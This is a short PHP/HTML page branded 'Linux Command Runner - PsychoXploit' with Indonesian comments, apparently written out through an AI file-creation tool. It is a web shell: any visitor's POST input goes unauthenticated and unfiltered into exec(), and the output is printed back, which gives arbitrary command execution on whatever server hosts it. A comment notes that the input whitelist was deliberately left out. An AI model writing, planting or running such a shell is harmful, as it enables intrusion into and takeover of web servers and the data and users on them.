<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Linux Command Runner - PsychoXploit</title>
    <style>
        /* Reset dan dasar */
        * {
            box-sizing: border-box;
        }
        body {
            margin: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #121212;
            color: #e0e0e0;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            padding: 20px;
        }
        h1 {
            color: #bb86fc;
            text-align: center;
            margin-bottom: 20px;
        }
        form {
            max-width: 600px;
            margin: 0 auto 30px auto;
            display: flex;
        }
        input[type="text"] {
            flex-grow: 1;
            padding: 12px 16px;
            border: none;
            border-radius: 6px 0 0 6px;
            font-size: 1rem;
            background-color: #1e1e1e;
            color: #e0e0e0;
            outline: none;
            transition: background-color 0.3s ease;
        }
        input[type="text"]:focus {
            background-color: #2e2e2e;
        }
        button {
            padding: 12px 20px;
            border: none;
            border-radius: 0 6px 6px 0;
            background-color: #bb86fc;
            color: #121212;
            font-weight: bold;
            font-size: 1rem;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }
        button:hover {
            background-color: #9a67ea;
        }
        pre {
            max-width: 600px;
            margin: 0 auto;
            white-space: pre-wrap;
            word-wrap: break-word;
            background-color: #1e1e1e;
            border-radius: 8px;
            padding: 20px;
            box-shadow: 0 0 10px rgba(187, 134, 252, 0.3);
            font-family: Consolas, Monaco, 'Courier New', monospace;
            font-size: 0.95rem;
            color: #ddd;
            overflow-x: auto;
            user-select: text;
        }
        footer {
            text-align: center;
            margin-top: auto;
            color: #888;
            font-size: 0.9rem;
        }
        @media screen and (max-width: 640px) {
            form {
                flex-direction: column;
                max-width: 100%;
            }
            input[type="text"], button {
                border-radius: 6px;
                margin: 5px 0;
            }
        }
    </style>
</head>
<body>
    <h1>Linux Command Runner - PsychoXploit</h1>
    <form method="POST" autocomplete="off">
        <input type="text" name="command" placeholder="Masukkan perintah Linux di sini..." required autofocus
        value="<?php echo isset($_POST['command']) ? htmlspecialchars($_POST['command']) : ''; ?>" />
        <button type="submit">Jalankan</button>
    </form>

    <?php
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST['command'])) {
        // Ambil perintah dan bersihkan input
        $command = trim($_POST['command']);
        
        // Amankan input dengan whitelist sederhana (optional)
        // Namun agar fleksibel, di sini hanya sanitize untuk keamanan HTML output.
        
        // Jalankan perintah dan tangkap output dan status kode
        $output = [];
        $return_var = 0;
        // shell_exec bisa juga digunakan, tapi exec memungkinkan mendapatkan kode status
        exec($command . ' 2>&1', $output, $return_var);

        echo '<pre>';
        echo "Perintah: " . htmlspecialchars($command) . "\n\n";
        echo implode("\n", array_map('htmlspecialchars', $output));
        echo "\n\nKode keluar: " . $return_var;
        echo '</pre>';
    }
    ?>

    <footer>
        &copy; 2025 - Linux Command Runner by PsychoXploit
    </footer>
</body>
</html>
</content>
</create_file>